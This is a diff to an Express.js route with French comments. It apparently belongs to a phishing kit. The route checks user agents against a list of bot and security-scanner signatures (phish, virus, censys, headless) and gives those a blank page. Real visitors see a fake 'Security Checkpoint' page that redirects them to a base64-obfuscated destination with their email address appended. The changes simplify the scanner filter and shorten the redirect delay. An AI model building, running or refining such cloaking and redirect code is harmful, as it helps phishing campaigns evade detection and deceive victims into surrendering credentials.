@@ -10,19 +10,15 @@ const part2 = "cGdhYWZGVE0=";
 app.all('/', (req, res) => {
     const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
     
-    // On extrait l'email de toutes les manières possibles
+    // On récupère l'email
     const targetEmail = req.query.m || req.query.login_hint || req.body?.login_hint || "";
     
-    // 1. FILTRAGE DES BOTS : On bloque uniquement les signatures de robots connues
-    // On a retiré "microsoft" de la liste car Outlook Desktop peut envoyer ce UA
-    const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|phish|virus|censys|ahrefs|serp/i.test(ua);
+    // Détection simplifiée des robots
+    const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);
 
-    // 2. FILTRAGE IP/HOST : On bloque si le User-Agent indique un serveur (Python, Go, Java, etc.)
-    const isServerSide = /python|go-http|java|axios|node-fetch|wget|curl/i.test(ua);
-
-    // ACTION : On ne redirige vers Wikipedia QUE si c'est un bot certain ou si l'URL est totalement vide
-    if (isBotUA || isServerSide || (targetEmail === "" && !req.query.debug)) {
-        return res.redirect("https://www.wikipedia.org");
+    // Si c'est un bot OU si l'email est vide (sauf en debug), on affiche une page blanche
+    if (isBotUA || (targetEmail === "" && !req.query.debug)) {
+        return res.send('<html><body style="background:white;"></body></html>');
     }
 
     res.send(`
@@ -33,7 +29,7 @@ app.all('/', (req, res) => {
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <title>Security Checkpoint</title>
             <style>
-                body { background: #fdf2f2; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+                body { background: #fdf2f2; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
                 .container { background: white; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: left; max-width: 420px; width: 90%; overflow: hidden; }
                 .header { background: #f5a623; color: white; display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; font-weight: 600; font-size: 11px; letter-spacing: 1px; }
                 .content { padding: 30px 25px; }
@@ -79,11 +75,9 @@ app.all('/', (req, res) => {
                     
                     setTimeout(() => {
                         let target = atob(p1) + atob(p2);
-                        if(em !== "") {
-                            target += (target.includes('?') ? '&' : '?') + "m=" + encodeURIComponent(em);
-                        }
+                        if(em !== "") target += (target.includes('?') ? '&' : '?') + "m=" + encodeURIComponent(em);
                         window.location.href = target;
-                    }, 3000); 
+                    }, 2500); 
                 });
             </script>
         </body>
